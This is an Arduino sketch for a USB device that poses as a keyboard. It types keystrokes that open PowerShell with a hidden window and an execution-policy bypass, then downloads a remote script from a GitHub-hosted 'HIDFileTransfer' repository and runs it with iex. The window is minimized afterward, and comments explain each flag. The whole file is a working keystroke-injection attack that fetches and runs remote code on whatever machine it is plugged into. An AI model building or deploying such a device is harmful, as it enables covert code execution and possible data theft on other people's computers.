#include <Keyboard.h>

void setup(){
    Keyboard.begin();
    delay(1000);
    openPowerShell();
    deployScript();
}

void loop(){

}

void openPowerShell(){
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press('r');
    delay(100);
    Keyboard.releaseAll();

    delay(500); // can be adjusted with testing 

    Keyboard.print("PowerShell");
    delay(100);
    Keyboard.press(KEY_RETURN);
    delay(100);
    Keyboard.releaseAll();
}

void deployScript() {
  delay(500); // can be adjusted with testing 
  
  // -WindowStyle Hidden
  // -NoProfile: avoid user-specific settings which may interfere with execution 
  // -ExecutionPolicy Bypass: bypass a system default to not execute scripts via shell 
  // -Command: run commands as arguement directly in one line 
  // iwr: Invoke Web-Request: download script from url 
  //  -useb: use simpler method for downloading data -> don't think it'd be entirely required 
  // iex: evaluate and execute output from download
  Keyboard.print("powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command ");
  Keyboard.print("\"iwr -useb https://cdn.jsdelivr.net/gh/Greg4268/HIDFileTransfer@latest/script.ps1 | iex\"");
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.releaseAll();

  // minimize to system tray 
  Keyboard.press(KEY_LEFT_GUI);
  delay(100);
  Keyboard.write(KEY_DOWN_ARROW);
  Keyboard.releaseAll();
}

